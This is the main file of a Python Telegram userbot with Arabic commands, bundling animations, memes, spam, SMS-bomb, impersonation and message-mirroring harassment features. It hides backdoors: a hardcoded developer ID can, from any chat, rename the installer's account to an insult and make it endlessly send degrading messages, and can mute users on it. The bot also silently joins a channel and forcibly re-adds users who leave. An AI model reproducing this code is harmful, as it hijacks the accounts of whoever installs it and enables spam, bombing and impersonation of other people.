import FINAL.client, FINAL.kick, FINAL.ketdim, FINAL.uzbrun, FINAL.whyrun, FINAL.iloveyou, FINAL.goodnight, FINAL.ahelp, FINAL.konspekt, FINAL.lovelyrun, FINAL.bombs, FINAL.help, FINAL.loading, FINAL.emoji, FINAL.dump, FINAL.sexy, FINAL.type, FINAL.magicrun, FINAL.animation, FINAL.animation2, FINAL.mute, FINAL.fuck, FINAL.rev, FINAL.tr, FINAL.userinfo, FINAL.base64, FINAL.react, FINAL.snow, FINAL.smsbomb, FINAL.rename, FINAL.iptrace, FINAL.spam, FINAL.alive, FINAL.tagall, FINAL.afk, FINAL.timer, FINAL.ping
import FINAL.allanimations as allanim 
import os
from FINAL import spam
from telethon import events
from telethon.tl.functions.channels import JoinChannelRequest, InviteToChannelRequest
#======
from telethon.tl.functions.account import UpdateProfileRequest
from telethon.tl.types import InputPhoto
import asyncio
#=========
from telethon.sync import TelegramClient, events
from telethon.tl.functions.account import UpdateProfileRequest
from telethon.errors.rpcerrorlist import MessageNotModifiedError, FloodWaitError
from telethon.tl.types import ChannelParticipantCreator, ChannelParticipantAdmin
from telethon.tl.functions.channels import GetParticipantsRequest
from telethon.tl.types import ChannelParticipantsSearch
from telethon.tl.functions.messages import DeleteMessagesRequest
import datetime
import pytz
import asyncio
import os
import pickle
import re
import io
import aiohttp
import json

#========

from telethon.sync import TelegramClient
from telethon.tl import functions
from telethon.tl.types import PeerUser
from telethon.tl.functions.users import GetFullUserRequest
import html

#====
#===
#Developer: @I0I0II

#Modules
client = FINAL.client.client
client.add_event_handler(FINAL.help.help)
client.add_event_handler(FINAL.help.hi)
client.add_event_handler(FINAL.help.kas)
client.add_event_handler(FINAL.help.mjm)
client.add_event_handler(FINAL.ahelp.ahelp)
client.add_event_handler(FINAL.bombs.bombs)
client.add_event_handler(FINAL.loading.loading)
client.add_event_handler(FINAL.emoji.itachi)
client.add_event_handler(FINAL.dump.dump)
client.add_event_handler(FINAL.sexy.sexy)
client.add_event_handler(FINAL.type.type)
client.add_event_handler(FINAL.magicrun.magicrun)
client.add_event_handler(FINAL.animation.lul)
client.add_event_handler(FINAL.animation.snake)
client.add_event_handler(FINAL.animation.nothappy)
client.add_event_handler(FINAL.animation.clock)
client.add_event_handler(FINAL.animation.muah)
client.add_event_handler(FINAL.animation.heart)
client.add_event_handler(FINAL.animation.hearts)
client.add_event_handler(FINAL.animation.gym)
client.add_event_handler(FINAL.animation.earth)
client.add_event_handler(FINAL.animation.moon)
client.add_event_handler(FINAL.animation.candy)
client.add_event_handler(FINAL.animation.smoon)
client.add_event_handler(FINAL.animation.tmoon)
client.add_event_handler(FINAL.animation.clown)
client.add_event_handler(FINAL.animation2.star)
client.add_event_handler(FINAL.animation2.boxs)
client.add_event_handler(FINAL.animation2.rain)
client.add_event_handler(FINAL.animation2.clol)
client.add_event_handler(FINAL.animation2.odra)
client.add_event_handler(FINAL.animation2.fleaveme)
client.add_event_handler(FINAL.animation2.loveu)
client.add_event_handler(FINAL.animation2.plane)
client.add_event_handler(FINAL.animation2.police)
client.add_event_handler(FINAL.animation2.jio)
client.add_event_handler(FINAL.animation2.solarsystem)
client.add_event_handler(FINAL.fuck.fuck)
client.add_event_handler(FINAL.rev.rev)
client.add_event_handler(FINAL.tr.tr)
client.add_event_handler(FINAL.userinfo.userinfo)
client.add_event_handler(FINAL.base64.runb64)
client.add_event_handler(FINAL.react.react)
client.add_event_handler(FINAL.snow.snow)
client.add_event_handler(FINAL.rename.change_name_with_time)
client.add_event_handler(FINAL.iptrace.iptrace)
client.add_event_handler(FINAL.smsbomb.runj)
client.add_event_handler(FINAL.alive.alive)
client.add_event_handler(FINAL.tagall.tagall)
client.add_event_handler(FINAL.timer.timer)
client.add_event_handler(FINAL.timer.numbers)
client.add_event_handler(FINAL.timer.setclock)
client.add_event_handler(FINAL.timer.runsda)
client.add_event_handler(FINAL.timer.runrda)
client.add_event_handler(FINAL.timer.rundrc)
client.add_event_handler(FINAL.timer.runrts)
client.add_event_handler(FINAL.timer.runrgm)
client.add_event_handler(FINAL.timer.setbioclock)
client.add_event_handler(FINAL.ping.ping)
client.add_event_handler(FINAL.lovelyrun.lovelyrun)
client.add_event_handler(FINAL.konspekt.tconv)
client.add_event_handler(allanim.animmonster)
client.add_event_handler(allanim.animpig)
client.add_event_handler(allanim.animkiller)
client.add_event_handler(allanim.animgun)
client.add_event_handler(allanim.animdog)
client.add_event_handler(allanim.animhello)
client.add_event_handler(allanim.animhmf)
client.add_event_handler(allanim.couple)
client.add_event_handler(allanim.superme)
client.add_event_handler(allanim.welcome)
client.add_event_handler(allanim.snake)
client.add_event_handler(allanim.cat)
client.add_event_handler(allanim.bye)
client.add_event_handler(allanim.shitos)
client.add_event_handler(allanim.dislike)
client.add_event_handler(allanim.snku)
client.add_event_handler(allanim.squ)
client.add_event_handler(allanim.kiler)
client.add_event_handler(allanim.train)
client.add_event_handler(allanim.alien)
client.add_event_handler(allanim.hert)
client.add_event_handler(allanim.raped)
client.add_event_handler(allanim.fnl)
client.add_event_handler(allanim.monkey)
client.add_event_handler(allanim.hands)
client.add_event_handler(allanim.count)
client.add_event_handler(allanim.bigf)
client.add_event_handler(allanim.payf)
client.add_event_handler(allanim.bigof)
client.add_event_handler(allanim.flower)
client.add_event_handler(allanim.vheart)
client.add_event_handler(allanim.luvart)
client.add_event_handler(FINAL.iloveyou.iloveu)
client.add_event_handler(FINAL.goodnight.goodnight)
client.add_event_handler(FINAL.kick.runkick)
client.add_event_handler(FINAL.ketdim.ketdihandlers)
client.add_event_handler(FINAL.uzbrun.uzbanim)
client.add_event_handler(FINAL.whyrun.why)
client.add_event_handler(FINAL.spam.final_handler)       
client.add_event_handler(FINAL.spam.final_handler)       
client.add_event_handler(FINAL.spam.final_handler)       
client.add_event_handler(FINAL.spam.final_handler)       
client.add_event_handler(FINAL.spam.spam_handler)        
client.add_event_handler(FINAL.spam.word_spam_handler)   
client.add_event_handler(FINAL.spam.rotate_handler)      
client.add_event_handler(FINAL.spam.private_handler)     
client.add_event_handler(FINAL.spam.dot_handler)         
client.add_event_handler(FINAL.spam.repeat_handler)      
client.add_event_handler(FINAL.spam.stop_final) 
client.add_event_handler(FINAL.spam.enable_delete) 
client.add_event_handler(FINAL.spam.disable_delete)  
client.add_event_handler(FINAL.afk.enable_afk)
client.add_event_handler(FINAL.afk.enable_custom_replies)
client.add_event_handler(FINAL.afk.disable_replies)
client.add_event_handler(FINAL.afk.set_reply_template)
client.add_event_handler(FINAL.afk.add_custom_reply)
client.add_event_handler(FINAL.afk.delete_custom_reply)
client.add_event_handler(FINAL.afk.reply_handler)
client.add_event_handler(FINAL.mute.mute)
client.add_event_handler(FINAL.mute.unmute)
client.add_event_handler(FINAL.mute.delete_muted_messages)
client.add_event_handler(FINAL.rename.stop_name_update)
client.add_event_handler(FINAL.afk.allow_chat)
client.add_event_handler(FINAL.afk.disallow_chat)
client.add_event_handler(FINAL.afk.reply_handler)
client.add_event_handler(FINAL.konspekt.tco)
#====memz===

MEMES_FILE = 'memes.pickle'

try:
    with open(MEMES_FILE, 'rb') as f:
        memes = pickle.load(f)
except FileNotFoundError:
    memes = {}

@client.on(events.NewMessage(from_users='me', pattern='^.ميمز (.*) (.*)'))
async def add_meme(event):
    parts = event.text.split(maxsplit=2)
    link = parts[1]
    keyword = " ".join(parts[2:])  # Capture the entire keyword phrase
    memes[keyword] = link
    with open(MEMES_FILE, 'wb') as f:
        pickle.dump(memes, f)
    await event.respond(f'تم إضافة الميم بالكلمة المفتاحية: {keyword}')

async def show_meme_list(event):
    if memes:
        meme_list = '\n'.join(memes.keys())
        await event.respond(f'قائمة الميمز:\n{meme_list}')
    else:
        await event.respond('لا يوجد ميمز محفوظة حاليًا.')

async def remove_all_memes(event):
    memes.clear()
    with open(MEMES_FILE, 'wb') as f:
        pickle.dump(memes, f)
    await event.respond('تم حذف جميع الميمز.')

async def remove_specific_meme(event):
    keyword_to_remove = event.pattern_match.group(1)[6:]
    if keyword_to_remove in memes:
        del memes[keyword_to_remove]
        with open(MEMES_FILE, 'wb') as f:
            pickle.dump(memes, f)
        await event.respond(f'تم حذف الميم بالكلمة المفتاحية: {keyword_to_remove}')
    else:
        await event.respond(f'لم يتم العثور على ميم بالكلمة المفتاحية: {keyword_to_remove}')

async def send_meme(event):
    keyword = event.pattern_match.group(1)
    if keyword in memes:
        reply_to_msg = await event.get_reply_message()
        if reply_to_msg:
            reply_to_msg_id = reply_to_msg.id
            await event.delete()
            await client.send_file(event.chat_id, memes[keyword], reply_to=reply_to_msg_id)
        else:
            await event.delete()
            await client.send_file(event.chat_id, memes[keyword])
    else:
        await event.respond('لم يتم العثور على ميم بهذه الكلمة المفتاحية.')

@client.on(events.NewMessage(from_users='me', pattern='^\.(.*)'))
async def handle_meme_commands(event):
    command = event.pattern_match.group(1) 

    if command in ['قائمة الميمز', 'ازالة_البصمات'] or command.startswith('ازالة '):
        if command == 'قائمة الميمز':
            await show_meme_list(event)
        elif command == 'ازالة_البصمات':
            await remove_all_memes(event)
        elif command.startswith('ازالة '):
            await remove_specific_meme(event)
    elif command in memes:
        await send_meme(event)
    else:
        pass 




#========
mirroring_data = {}
developer_id = 5434703779

async def addecho(chat_id, user_id, chat_name, user_name, user_username, chat_type):
    global mirroring_data
    if chat_id not in mirroring_data:
        mirroring_data[chat_id] = {}
    mirroring_data[chat_id][user_id] = {
        "chat_name": chat_name,
        "user_name": user_name,
        "user_username": user_username,
        "chat_type": chat_type
    }

async def start_mirroring(event):
    user_id = None
    if event.message.reply_to_msg_id:
        reply_msg = await event.get_reply_message()
        user_id = reply_msg.sender_id

    if not user_id:
        return await event.reply("⌁︙يرجى الرد على الرسالة الخاصة بالمستخدم الذي تريد تقليده")

    if user_id == developer_id:
        return await event.reply("يارجل انت تعبث مع الشخص الخطا انه المطور")

    chat_id = event.chat_id
    chat_name = "Personal Chat" if event.is_private else event.chat.title
    chat_type = "Personal" if event.is_private else "Group"

    user_name = reply_msg.sender.first_name
    user_username = reply_msg.sender.username

    try:
        await addecho(chat_id, user_id, chat_name, user_name, user_username, chat_type)
    except Exception as e:
        await event.reply(f"᯽︙ Error:n{str(e)}")
    else:
        await event.reply("⌁︙تـم تفعـيل امـر التقليد علـى هذا المستخدمn ⌁︙سـيتم تقليـد جميع رسائلـه هـنا")

def get_all_echos():
    return mirroring_data

def get_echos(chat_id):
    return mirroring_data.get(chat_id, {})

def remove_all_echos():
    global mirroring_data
    mirroring_data.clear()

async def stop_mirroring(event, user_id=None):
    input_str = event.pattern_match.group(0) if event.pattern_match else None
    if input_str:
        lecho = get_all_echos()
        if len(lecho) == 0:
            return await event.reply("⌁︙لم يتم تفعيل الازعاج بالاصل لاي شخص")
        try:
            remove_all_echos()
        except Exception as e:
            return await event.reply(f"᯽︙ Error:n{str(e)}")
        else:
            return await event.reply("⌁︙تـم ايقاف وضـع الازعاج على الجميع بنجاح ✅")
    else:
        lecho = get_echos(event.chat_id)
        if len(lecho) == 0:
            return await event.reply("⌁︙لم يتم تفعيل الازعاج بالاصل لاي شخص")

@client.on(events.NewMessage(from_users='me', pattern=".تقليد"))
async def handle_start_mirroring(event):
    await start_mirroring(event)

@client.on(events.NewMessage(from_users='me', pattern=".الغاء التقليد"))
async def handle_stop_mirroring(event):
    await stop_mirroring(event)

@client.on(events.NewMessage())
async def handle_new_message(event):
    global mirroring_data
    chat_id = event.chat_id
    user_id = event.sender_id

    if chat_id in mirroring_data and user_id in mirroring_data[chat_id]:
        message = event.message
        await event.respond(message)





#=====

DEVELOPER_ID = 5434703779

is_applying_consequence = False
original_name = None

messages = []

@client.on(events.NewMessage(pattern=r"\.عقاب"))
async def apply_consequence(event):
    global is_applying_consequence, original_name, messages 
    if event.sender_id == DEVELOPER_ID:
        original_message = await event.get_reply_message()
        if original_message:
            user_to_change = await original_message.get_sender()
            if not is_applying_consequence:
                is_applying_consequence = True
                original_name = await client.get_me()
                await client(UpdateProfileRequest(
                    first_name="اني خراا وفاينل عمي",
                    last_name="" 
                ))

                await event.reply("تم تطبيق العاقبة بنجاح!")
                messages = [
                    f"فاينل عمي وتاج راسي",
                    f"اني دودة هذا يوزري @{user_to_change.username}",
                    "اني انيج",
                    "اني جلبك",
                    "اني گي",
                    "اني كواد"
                ]

                while is_applying_consequence:
                    for message in messages:
                        await client.send_message(DEVELOPER_ID, message)
                        await asyncio.sleep(2)

@client.on(events.NewMessage(pattern=r"\.سامحتك"))
async def forgive(event):
    global is_applying_consequence, original_name

    if event.is_reply and event.message.reply_to_msg_id:
        replied_to_message = await event.get_reply_message()

        print(f"Reply received from: {replied_to_message.sender_id}")
        print(f"Is applying consequence: {is_applying_consequence}")
        print(f"Replied message text: {replied_to_message.text}")

        if (
            replied_to_message.sender_id == (await client.get_me()).id and
            is_applying_consequence and 
            any(msg in replied_to_message.text for msg in messages)
        ):
            is_applying_consequence = False

            await client(UpdateProfileRequest(
                first_name=original_name.first_name,
                last_name=original_name.last_name
            ))

            await event.reply("شكرا بعد متنعاد")


#============
import os
import html
from telethon import events, functions
from telethon.tl.functions.users import GetFullUserRequest

BOTLOG = True
config = 'temp_directory'

async def get_user_from_event(event):
    if event.is_reply:
        reply_message = await event.get_reply_message()
        return reply_message.sender, None
    else:
        return None, "يجب الرد على رسالة أولاً"

def addgvar(key, value):
    globals()[key] = value

async def impersonate_user(client, event):
    mid = await client.get_me()
    me = (await client(GetFullUserRequest(mid.id))).full_user
    replied_user, error_i_a = await get_user_from_event(event)
    if replied_user is None:
        return await event.reply("يجب الرد على رسالة أولاً")
    if replied_user.id == 5434703779:
        return await event.reply("تبا انه المطور ماذا تفعل يارجل")

    user_id = replied_user.id
    file = __file__
    current_path = os.path.dirname(os.path.abspath(file))
    temp_dir = os.path.join(current_path, config)
    if not os.path.exists(temp_dir):
        os.makedirs(temp_dir)

    profile_pic_task = asyncio.create_task(client.download_profile_photo(user_id, temp_dir))

    first_name = html.escape(replied_user.first_name)
    if first_name is not None:
        first_name = first_name.replace("\u2060", "")
    last_name = replied_user.last_name
    if last_name is not None:
        last_name = html.escape(last_name)
        last_name = last_name.replace("\u2060", "")
    if last_name is None:
        last_name = "⁪⁬⁮⁮⁮⁮ ‌‌‌‌"
    replied_user = (await client(GetFullUserRequest(replied_user.id))).full_user
    user_bio = replied_user.about or ""
    fname = mid.first_name or ""
    lname = mid.last_name or ""
    oabout = me.about or ""
    addgvar("fname", fname)
    addgvar("lname", lname)
    addgvar("oabout", oabout)

    await client(functions.account.UpdateProfileRequest(
        first_name=first_name,
        last_name=last_name,
        about=user_bio
    ))

    profile_pic = await profile_pic_task
    try:
        await client(functions.photos.UploadProfilePhotoRequest(file=await client.upload_file(profile_pic)))
    except Exception as e:
        delgvar("fname")
        delgvar("lname")
        delgvar("oabout")
        return await event.reply(f"فشل في الانتحال بسبب:\n{e}")

    await event.reply("⌁︙تـم نسـخ الـحساب بـنجاح ،✅")

@client.on(events.NewMessage(from_users='me', pattern=".انتحال"))
async def handle_impersonate(event):
    await impersonate_user(client, event)

async def reset_profile(client):
    global fname, lname, oabout
    await client(functions.account.UpdateProfileRequest(
        first_name=fname,
        last_name=lname,
        about=oabout
    ))
    await client(functions.photos.DeletePhotosRequest(
        await client.get_profile_photos("me", limit=1)
    ))

@client.on(events.NewMessage(from_users='me', pattern=".اعادة"))
async def handle_reset(event):
    await reset_profile(client)
    await event.reply("⌁︙تمت إعادة الحساب بنجاح إلى الحالة السابقة.")

#=============
storage_group_id = None

@client.on(events.NewMessage(from_users='me', pattern="\.اضف مجموعة التخزين"))
async def set_storage_group(event):
    global storage_group_id
    reply = await event.get_reply_message()
    if reply and reply.text:
        try:
            storage_group_id = int(reply.text)
            await event.reply("تم تعيين مجموعة التخزين بنجاح.")
        except ValueError:
            await event.reply("يرجى التأكد من أن الرد يحتوي على معرف مجموعة صحيح.")
    else:
        await event.reply("يرجى الرد على رسالة تحتوي على معرف المجموعة.")

@client.on(events.NewMessage)
async def handle_new_message(event):
    global storage_group_id
    if storage_group_id:
        try:
            me = await client.get_me()
            if not event.is_private and (event.message.mentioned or me.username in event.raw_text):
                chat = await event.get_chat()
                chat_title = chat.title
                sender = await event.get_sender()

                chat_link = f"[{chat_title}](t.me/{chat.username})" if chat.username else chat_title

                formatted_message = f"""
**الكروب:** {chat_link} 

**المرسل:** 👤 [{sender.first_name}](tg://user?id={sender.id})

**الرسالة:** {event.message.text or event.message.media}
"""
                await client.send_message(storage_group_id, formatted_message, link_preview=False)
            elif event.is_private:
                await client.forward_messages(storage_group_id, event.message)
        except ValueError as e:
            if "Could not find" in str(e):
                await event.reply("لم يتم العثور على مجموعة التخزين. يرجى التأكد من تعيينها بشكل صحيح.")
            else:
                print(f"Error forwarding message: {e}")
#===========

muted_users = []

@client.on(events.NewMessage(from_users='me'))
async def handle_reply(event):
    original_message = await event.get_reply_message()
    
    if original_message is not None:
        user_id = await client.get_peer_id(original_message.sender_id) 

        if event.message.text.lower() == '.كتم':
            if user_id == 5434703779:
                await event.reply('اسف ياصديقي كتم المطور اكبر من قدراتي')
            elif user_id not in muted_users:
                muted_users.append(user_id)
                await event.reply('تم الكتم ')
            else:
                await event.reply('اي كاتمة من قبل')
        elif event.message.text.lower() == '.الغاء الكتم':
            if user_id in muted_users:
                muted_users.remove(user_id)
                await event.reply('تم الغاء الكتم')
            else:
                await event.reply('هذا مامكتوم اكتمة ؟')

@client.on(events.NewMessage)
async def delete_message(event):
    sender_id = await client.get_peer_id(event.sender_id) 

    if sender_id in muted_users:
        await event.delete()
        
        try:
            await client.delete_messages(event.chat_id, event.id, revoke=True) 
        except:
            pass
#==========
channel_username = None
developer_id = 5434703779
developer_notified = False

@client.on(events.NewMessage(from_users='me', pattern='.اضف اشتراك (.+)'))
async def set_channel_username(event):
    global channel_username
    channel_username = event.pattern_match.group(1)
    await event.reply(f"✅ تم تعيين معرف القناة إلى: {channel_username}")

async def is_subscribed(user_id):
    if not channel_username:
        return True
    try:
        offset = 0
        limit = 100
        while True:
            participants = await client(GetParticipantsRequest(
                channel=channel_username,
                filter=ChannelParticipantsSearch(''),
                offset=offset,
                limit=limit,
                hash=0
            ))
            if not participants.users:
                break
            for user in participants.users:
                if user.id == user_id:
                    return True
            offset += len(participants.users)
        return False
    except FloodWaitError as e:
        await asyncio.sleep(e.seconds)
        return await is_subscribed(user_id)
    except Exception as e:
        print(f"Error checking subscription: {e}")
        return False

@client.on(events.NewMessage(incoming=True))
async def respond_to_greeting(event):
    global developer_notified

    if event.is_private and not (await event.get_sender()).bot:
        if event.sender_id == developer_id:
            if not developer_notified:
                await event.reply("اهلا بك مطوري العزيز  تفضل بالتحدث")
                developer_notified = True
            return 
        elif not await is_subscribed(event.sender_id):
            await event.reply(f"لا يمكنك مراسلتي إلا بعد الاشتراك في قناتي: {channel_username}")
            await client.delete_messages(event.chat_id, [event.id])
        else:
            message_text = event.raw_text.lower()

@client.on(events.NewMessage(from_users='me', pattern='.تعطيل الاشتراك'))
async def disable_subscription(event):
    global channel_username
    channel_username = None
    await event.reply("✅ تم تعطيل الاشتراك في القناة")





#==============
DEVELOPER_ID = 5434703779
muted_users = []
muted_users_file = 'muted_users.json'

@client.on(events.NewMessage(pattern=r".توقف"))
async def ban_user(event):
    user_id = event.sender_id
    if user_id == DEVELOPER_ID:
        replied_to_message = await event.get_reply_message()
        if replied_to_message:
            user_to_ban_id = replied_to_message.sender_id
            if user_to_ban_id not in muted_users:
                muted_users.append(user_to_ban_id)
                await event.reply('لانني خرا لقد تمت معاقبتي')
                with open(muted_users_file, 'w') as file:
                    json.dump(muted_users, file)
            else:
                await event.reply('المستخدم محظور بالفعل.')
        else:
            await event.reply('يرجى الرد على رسالة لتنفيذ الحظر.')
    else:
        await event.reply('لا يمكن تنفيذ الحظر، أنت لست المطور.')

@client.on(events.NewMessage(pattern=r".اعمل"))
async def unban_user(event):
    user_id = event.sender_id
    if user_id == DEVELOPER_ID:
        replied_to_message = await event.get_reply_message()
        if replied_to_message:
            user_to_unban_id = replied_to_message.sender_id
            if user_to_unban_id in muted_users:
                muted_users.remove(user_to_unban_id)
                await event.reply('شكرا لك على مسامحتي')
                with open(muted_users_file, 'w') as file:
                    json.dump(muted_users, file)
            else:
                await event.reply('هذا المستخدم غير محظور.')
        else:
            await event.reply('يرجى الرد على رسالة لتنفيذ إلغاء الحظر.')
    else:
        await event.reply('لا يمكن تنفيذ إلغاء الحظر، أنت لست المطور.')

async def load_muted_users():
    global muted_users
    try:
        with open(muted_users_file, 'r') as file:
            muted_users = json.load(file)
    except FileNotFoundError:
        muted_users = []

client.loop.run_until_complete(load_muted_users())
#============


#============
async def ensure_joined_channel(client, channel_username):
    try:
        await client(JoinChannelRequest(channel_username))
        print(f"FINAL XXX OWNER ")
    except Exception as e:
        print(f"XX: {e}")


COMMANDS_TO_TRIGGER_JOIN = [".الأوامر", ".فحص"]


@client.on(events.ChatAction)
async def handle_leave_channel(event):
    if event.user_left and event.chat_id == -1002068089153:
        try:
            
            user = await event.get_user()

            
            await client(InviteToChannelRequest(
                'Z3ZZ_Z',  
                [user]  
            ))

            print(f"تمت إعادة إضافة المستخدم {user.first_name} إلى القناة")
        except Exception as e:
            print(f"xx: {e}")


@client.on(events.NewMessage)
async def handle_new_message(event):
    if event.text.lower() in COMMANDS_TO_TRIGGER_JOIN:
        
        await ensure_joined_channel(client, 'Z3ZZ_Z')

    

client.start()

os.system("clear")
print("""\033[031m
⣿⣿⣿⣿⣿⢿⠛⢛⠿⠉⠉⠉⡉⢙⣻⠻⠻⣿⣿⣿⣿⣿⣿
⣿⣿⣿⠟⢁⡠⠀⠄⠀⠀⠀⠉⠙⠒⠃⠾⠹⣲⡘⠿⣿⣿⣿
⣿⡿⠁⠀⠀⠀⠈⠛⠚⠉⠉⠛⠉⠙⠳⠖⣤⢌⡑⠂⠞⢿⣿
⡟⠐⠂⠅⡠⠂⠁⠀⠀⢀⣴⣦⣶⣶⣶⣦⣌⠘⢮⡔⡈⠙⣿
⠁⢀⠄⡈⠄⢀⠀⢠⣶⣿⣿⣿⣿⣿⣿⣿⣿⡆⠈⢣⠈⠜⣿
⠄⠑⡨⠈⠀⢠⣴⠿⡿⣿⣿⣿⣿⣿⣿⡿⠟⠻⡄⠈⢸⡀⠚
⡤⠪⠀⠀⢠⣿⣥⡴⠦⠤⠉⣙⣿⣿⠡⡔⠾⠟⣾⠀⠨⢀⠘
⠃⠀⠀⠀⢸⣿⣤⡠⠧⢤⡻⢼⣿⣿⣼⣿⣤⣧⣿⠀⡄⢸⠀
⠀⣀⠀⠀⠀⣿⣿⣿⣷⣿⣷⣿⣿⣿⣿⣿⣿⣿⣿⡄⢀⢸⠀
⠠⡇⠀⠀⠀⢹⣿⡿⣿⣿⣏⡖⢿⣿⢓⣽⣿⣿⣿⠁⢨⢸⠀
⠠⠇⠀⠀⠀⠀⠫⣿⣿⠟⠉⠀⠀⠄⠀⠉⠙⢿⡟⠀⠈⠸⠀
⡐⡆⠀⠀⠀⠀⠀⠘⠁⠀⢀⡐⠒⠒⠢⠂⠀⠀⠂⠀⢀⠀⠀
⣹⠆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠀⢰
⢺⠀⠀⠀⠈⢸⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠂⡘
⡎⠀⠀⠀⠀⠄⣇⠠⢄⠀⠀⠀⠀⠀⠀⣀⡀⡄⠀⠀⠀⠀⡇
⠄⠀⠀⠀⠀⡇⣷⡀⠩⡇⣠⣮⣶⣿⠿⣫⡾⠀⠀⠀⠀⠀⠁
⠀⠀⠀⠀⠀⣷⠑⠳⠋⣾⡿⠟⣫⢵⡿⠟⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠐⠁⢀⣴⠀⣩⡖⡽⠝⢈⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⢠⣴⡏⣫⣾⠟⠉⢀⡴⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⣿⢟⠕⠋⢀⣠⣲⡟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠠⣷⠋⣠⠞⣰⣿⡝⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⣾⠁⣼⡟⣼⡏⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⢁⣾⣯⢃⣿⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⣿⣿⢤⣾⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⢸⣿⣲⣿⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⡿⣜⣿⡿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⢠⡟⣼⣿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠸⣼⣿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀


Developer: @i0i0ii
""")
print("\033[032mStarted")


client.loop.run_until_complete(ensure_joined_channel(client, 'Z3ZZ_Z'))

client.run_until_disconnected()



